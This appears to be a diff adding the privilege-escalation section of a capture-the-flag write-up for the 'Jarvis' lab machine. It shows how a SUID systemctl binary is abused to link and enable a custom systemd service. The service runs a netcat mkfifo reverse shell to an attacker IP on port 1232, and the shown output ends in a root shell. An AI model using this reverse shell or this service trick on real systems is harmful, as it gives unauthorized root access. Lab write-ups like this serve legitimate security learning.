@@ -178,5 +178,62 @@ find / -perm -u=s -type f 2>/dev/null
 pepper@jarvis:/var/www$ 
 
 ```
+To exploit this we have to create our own service which will get us shell so we use [this](https://www.linode.com/docs/quick-answers/linux/start-service-at-boot/) website to get a template for service creation
 
+```
+[Unit]
+Description=Example systemd service.
 
+[Service]
+Type=simple
+ExecStart=/bin/bash /home/pepper/lol.sh
+
+[Install]
+WantedBy=multi-user.target
+```
+we saved it as ```sarthak.service``` and given proper permissions ```chmod 777 sarthak.service``` and that ```lol.sh``` has another netcat shell which will pop shell on port 1232 
+```
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.239 1232 >/tmp/f" > lol.sh;chmod +x lol.sh
+```
+Now we will take reference from this [site](https://gtfobins.github.io/gtfobins/systemctl/)
+
+  - assigned TF variable ```TF=/home/pepper/sarthak.service```
+  - Link the sarthak.service ```/bin/systemctl link $TF```
+  - Start a listner on port 1232
+  - Enable the service ``` /bin/systemctl enable --now $TF ```
+  
+ OUTPUT:-
+ ```
+ pepper@jarvis:~$ TF=/home/pepper/sarthak.service
+TF=/home/pepper/sarthak.service
+pepper@jarvis:~$ /bin/systemctl link $TF
+/bin/systemctl link $TF
+Created symlink /etc/systemd/system/sarthak.service -> /home/pepper/sarthak.service.
+pepper@jarvis:~$ /bin/systemctl enable --now $TF
+/bin/systemctl enable --now $TF
+Created symlink /etc/systemd/system/multi-user.target.wants/sarthak.service -> /home/pepper/sarthak.service.
+pepper@jarvis:~$ 
+ ```
+ 
+ And on our netcat now :)
+ 
+ ```
+ [sarthak@sarthak ~]$ nc -nvlp 1232
+Connection from 10.10.10.143:44684
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# python -c 'import pty;pty.spawn("/bin/bash")'
+root@jarvis:/# id
+id
+wuid=0(root) gid=0(root) groups=0(root)
+root@jarvis:/# hoami
+whoami
+root
+
+ ```
+ Hooray !!! We rooted it 
+ <<meme>>
+ <br/>
+This was a good and straight forward machine,
+and if you guys like it stay tuned for more :)
